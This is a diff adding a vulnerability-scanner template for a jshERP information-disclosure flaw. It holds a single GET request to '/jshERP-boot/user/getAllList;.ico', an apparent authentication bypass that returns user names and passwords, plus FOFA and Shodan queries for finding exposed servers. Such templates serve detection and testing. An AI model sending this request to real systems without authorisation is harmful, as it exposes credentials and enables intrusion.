@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - condition: and
+          type: word
+          words:
+            - '"username":'
+            - '"loginName":'
+            - '"password":'
+        - part: header
+          type: word
+          words:
+            - application/json
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/jshERP-boot/user/getAllList;.ico'
+id: CNVD-2020-63964
+info:
+    author: brucelsone
+    description: |
+        jshERP that can reveal sensitive information including system credentials without credentials.
+    metadata:
+        fofa-query: jshERP-boot
+        max-request: 1
+        shodan-query: http.favicon.hash:-1298131932
+    name: jshERP - Information Disclosure
+    reference:
+        - https://cn-sec.com/archives/1798444.html
+    severity: high
+    tags:
+        - cnvd2022
+        - jsherp
+        - disclosure
